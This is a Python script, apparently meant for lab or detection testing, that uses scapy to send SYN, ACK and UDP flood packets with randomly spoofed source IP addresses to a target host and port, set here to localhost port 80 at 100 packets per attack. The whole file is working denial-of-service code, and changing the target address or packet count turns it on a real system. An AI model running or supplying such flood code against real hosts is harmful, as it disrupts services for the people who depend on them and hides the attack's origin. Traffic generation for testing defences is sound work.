from scapy.all import send, IP, TCP, UDP
from random import randint

# Target IP and port
TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

# Number of packets to send for each attack
NUM_PACKETS = 100

# Function to generate random IP
def random_ip():
    return f"{randint(1, 255)}.{randint(0, 255)}.{randint(0, 255)}.{randint(0, 255)}"

# Simulate SYN Flood
def syn_flood():
    print("Simulating SYN Flood...")
    for i in range(NUM_PACKETS):
        pkt = IP(src=random_ip(), dst=TARGET_IP) / TCP(sport=randint(1024, 65535), dport=TARGET_PORT, flags="S")
        send(pkt, verbose=False)

# Simulate ACK Flood
def ack_flood():
    print("Simulating ACK Flood...")
    for i in range(NUM_PACKETS):
        pkt = IP(src=random_ip(), dst=TARGET_IP) / TCP(sport=randint(1024, 65535), dport=TARGET_PORT, flags="A")
        send(pkt, verbose=False)

# Simulate UDP Flood
def udp_flood():
    print("Simulating UDP Flood...")
    for i in range(NUM_PACKETS):
        pkt = IP(src=random_ip(), dst=TARGET_IP) / UDP(sport=randint(1024, 65535), dport=TARGET_PORT)
        send(pkt, verbose=False)

# Simulate the attacks
syn_flood()
ack_flood()
udp_flood()

